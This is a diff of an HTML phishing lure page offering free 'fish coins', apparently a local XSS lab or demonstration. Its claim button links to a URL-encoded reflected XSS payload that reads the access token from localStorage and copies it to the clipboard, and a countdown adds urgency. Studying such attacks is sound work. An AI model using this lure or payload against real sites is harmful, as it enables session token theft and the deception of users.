@@ -67,7 +67,7 @@
             class="claim-button">
             立即領取魚幣
         </a> -->
-        <a href="http://localhost:5174/search?q=%3Cimg%20src%3Dx%20onerror%3D%22var%20t%20%3D%20localStorage.getItem%28%27access_token%27%29%3Bnavigator.clipboard.writeText%28t%29%3Bdocument.body.innerHTML%20%2B%3D%20%27%3Cp%3EToken%20copied%20to%20clipboard%3C%2Fp%3E%27%3B%22%3E"
+        <a href="http://localhost:5173/search?q=%3Cimg%20src%3Dx%20onerror%3D%22var%20t%20%3D%20localStorage.getItem%28%27access_token%27%29%3Bnavigator.clipboard.writeText%28t%29%3Bdocument.body.innerHTML%20%2B%3D%20%27%3Cp%3EToken%20copied%20to%20clipboard%3C%2Fp%3E%27%3B%22%3E"
             class="claim-button">
             立即領取魚幣
         </a>
@@ -75,33 +75,7 @@
         <div class="limited-text">⚠️ 僅限前1000名用戶</div>
     </div>
 
-    <script>
-        // 倒計時功能（設定為5分鐘）
-        let totalSeconds = 5 * 60; // 5分鐘
-
-        function updateCountdown() {
-            const minutes = Math.floor(totalSeconds / 60);
-            const seconds = totalSeconds % 60;
-
-            document.getElementById("minutes").textContent = String(
-                minutes
-            ).padStart(2, "0");
-            document.getElementById("seconds").textContent = String(
-                seconds
-            ).padStart(2, "0");
-
-            if (totalSeconds > 0) {
-                totalSeconds--;
-            } else {
-                // 時間到後重新設定
-                totalSeconds = 5 * 60;
-            }
-        }
-
-        // 每秒更新一次
-        setInterval(updateCountdown, 1000);
-        updateCountdown(); // 立即執行一次
-    </script>
+    <script src="script.js"></script>
 </body>
 
 </html>
